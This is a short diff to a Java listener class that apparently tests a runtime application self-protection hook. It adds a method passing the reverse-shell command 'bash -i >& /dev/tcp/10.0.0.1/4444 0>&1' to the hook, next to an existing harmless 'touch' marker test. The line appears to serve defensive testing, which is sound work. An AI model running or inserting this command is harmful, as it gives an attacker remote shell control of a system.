@@ -9,4 +9,9 @@ public final class RunExecutableListener {
     Java8RaspHooks.beforeRuntimeExecArray(
         new String[] {"sh", "-c", "touch /tmp/ohmyrasp-solr12629-success"});
   }
+
+  public static void invokeJava8ReverseShell() {
+    Java8RaspHooks.beforeRuntimeExecArray(
+        new String[] {"bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"});
+  }
 }
